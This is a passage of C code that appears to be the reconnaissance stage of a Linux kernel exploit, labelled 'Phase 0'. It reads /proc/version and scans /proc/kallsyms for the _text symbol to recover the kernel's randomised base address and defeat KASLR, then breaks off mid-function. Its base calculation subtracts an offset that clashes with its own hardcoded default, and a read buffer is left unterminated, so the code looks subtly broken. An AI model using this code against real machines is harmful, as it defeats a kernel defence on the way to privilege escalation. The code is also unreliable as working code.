static unsigned long kernel_base = 0xffffffff81000000UL;

static void probe_kernel() {
    LOG("Phase 0: Probing kernel...");
    char buf[256];
    int fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        read(fd, buf, sizeof(buf)-1);
        close(fd);
        LOG("Kernel: %s", buf);
    }
    // Try to read kallsyms (if available)
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, " _text")) {
                unsigned long addr;
                sscanf(line, "%lx", &addr);
                kernel_base = addr - 0x1000000;
                LOG("KASLR base: 0x%lx", kernel_base);
                break;
            }
        }
        fclose(fp);
    }
